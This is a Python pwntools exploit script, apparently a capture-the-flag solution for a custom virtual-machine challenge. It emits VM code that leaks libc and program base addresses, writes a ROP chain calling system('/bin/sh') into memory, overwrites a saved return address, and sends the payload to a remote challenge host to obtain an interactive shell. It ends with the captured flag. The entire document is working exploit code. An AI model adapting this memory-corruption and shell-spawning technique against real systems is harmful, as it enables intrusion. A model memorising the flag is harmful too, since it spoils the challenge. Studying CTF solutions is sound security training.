from pwn import *
from asmer import Assembler

assembler = Assembler()

def write(code, offset, value):
    for i in range(4):
        code += f"""
            MOVI R0, {(value >> 16*i) % 2**16}
            XCHG {(offset * 4 - (4 - i)) % 2**8}, R0  
        """
    return code


def write_rop(code, offset, addr):
    for i in range(4):
        code += f"""
            MOVI {4+i}, {((addr)>> i*16) & 0xffff}
            ADD {4+i}, {i}
            STORE {4+i}, {offset*8+2*i}
            SHR {4+i}, 8
            STORE {4+i}, {offset*8+2*i+1} 
        """
    return code


def set_r(code, registers, values):
    for i in range(len(registers)):
        code += f"""
            MOVI {registers[i]}, {values[i]}
        """
    return code

def add_r(code, registers, values):
    for i in range(len(registers)):
        code += f"""
            ADDI {registers[i]}, {values[i]}
        """
    return code

def read_r(code, registers, offset):
    code = set_r(code, registers, [0]*len(registers))
    for i in range(len(registers)):
        code += f"""
            ADD {registers[i]}, {(offset * 4 - (4 - i)) % 2**8}
        """
    return code

libc = ELF("./libc.so.6")
context.binary = libc

pop_rsp = 0x000000000003c058
pop_rbp = 0x0000000000001493
leave_ret = 0x00000000000299d2


rop = ROP(libc)
rop.raw("A"*8)
for i in range(401): rop.raw(rop.ret.address)
rop.system(next(libc.search(b"/bin/sh\x00")))
a = rop.chain()


code = ""
code = read_r(code, [0, 1, 2, 3], -13)
code = add_r(code, [0, 1], [(-596383 % 2**16), -((596383) >> 16) % 2**16]) # set libc base

for i in range(0, len(a), 8):
    code = write_rop(code, i//8, u64(a[i:i+8])) # write rop chain in data
    
code = add_r(code, [0, 1], [(leave_ret % 2**16), (leave_ret >> 16) % 2**16]) # set R0 and R1 to leave & 0xffff
code = read_r(code, [4, 5, 6, 7], -1)
code = add_r(code, [4, 5], [(-4887 % 2**16), -((4887) >> 16) % 2**16]) # set elf base
code = add_r(code, [4, 5], [(pop_rbp % 2**16), (pop_rbp >> 16) % 2**16]) # set R4 and R5 to pop rbp & 0xffff
code += f"XCHG {-8 % 2**8}, 4" # overwrite saved rip to pop rbp

assembler.assemble(code)
machine_code = bytes(assembler.get_machine_code())

with open("shellcode.bin", "wb") as f: 
    f.write(machine_code)

import base64
while True:
    p = remote('ikutoppene-1105-eptvm.ept.gg', 1337, ssl=True)
    #p = process(["./vm_patched"])
    try:
        p.sendline(base64.b64encode(machine_code))
        p.recvuntil("shellcode.bin\n\n", timeout=1)
        p.recvline(timeout=1)
        p.interactive()
        break
    except EOFError:
        p.close()
        continue

# EPT{089827a37a3d45a8dba5a7003f524739}


